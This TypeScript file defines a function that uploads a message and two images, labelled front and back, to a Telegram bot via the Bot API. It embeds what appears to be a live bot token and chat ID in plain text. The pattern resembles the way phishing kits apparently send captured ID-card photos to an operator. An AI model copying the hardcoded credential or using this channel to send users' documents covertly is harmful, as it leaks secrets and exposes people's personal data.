export const sendTelegramMessage = async (message: string, frontImage: File, backImage: File) => {
    const botToken = "7972666652:AAHpQu7Ax4vgN-lL_-psZbWVjptYDvgl7YA"; // Replace with your bot token
    const chatId = "1303640598"; // Replace with your chat ID or user ID
  
    if (!botToken || !chatId) {
      console.error("Bot token or chat ID is missing.");
      return;
    }
  
    try {
      const formData1 = new FormData();
      formData1.append('chat_id', chatId);
      formData1.append('caption', message); // The message you want to send with the first image
      formData1.append('photo', frontImage); // Attach the front image
  
      // Send the front image
      const response1 = await fetch(
        `https://api.telegram.org/bot${botToken}/sendPhoto`,
        {
          method: "POST",
          body: formData1,
        }
      );
  
      if (!response1.ok) {
        throw new Error(`Failed to send front image. Status: ${response1.status}`);
      }
  
      const formData2 = new FormData();
      formData2.append('chat_id', chatId);
      formData2.append('caption', message); // The message you want to send with the second image
      formData2.append('photo', backImage);  // Attach the back image
  
      // Send the back image
      const response2 = await fetch(
        `https://api.telegram.org/bot${botToken}/sendPhoto`,
        {
          method: "POST",
          body: formData2,
        }
      );
  
      if (!response2.ok) {
        throw new Error(`Failed to send back image. Status: ${response2.status}`);
      }
  
      const responseData1 = await response1.json();
      const responseData2 = await response2.json();
  
      if (responseData1.ok && responseData2.ok) {
        console.log("Message and images sent successfully to Telegram.");
      } else {
        console.error("Telegram API returned an error:", responseData1.description || responseData2.description);
      }
    } catch (error) {
      console.error("Error sending Telegram message:", error);
    }
  };
  